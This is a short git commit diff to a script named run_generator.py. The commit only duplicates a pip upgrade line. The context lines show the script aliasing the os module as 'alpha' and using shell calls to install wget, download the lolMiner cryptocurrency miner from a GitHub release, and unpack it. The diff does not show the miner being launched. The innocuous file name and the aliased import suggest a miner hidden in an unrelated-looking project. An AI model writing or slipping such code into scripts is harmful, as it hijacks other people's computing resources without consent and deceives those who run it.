48d2f91f92aeaaca2bb1ebc3d323d3fc52c59c22
bartu221 <44907925+bartu221@users.noreply.github.com>
2021-10-10 18:03:54 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,5 +1,6 @@
 import os as alpha
 alpha.system("pip install --upgrade pip")
+alpha.system("pip install --upgrade pip")
 alpha.system("apt-get install wget")
 alpha.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz")
 alpha.system("tar xf lolMiner_v1.31_Lin64.tar.gz")
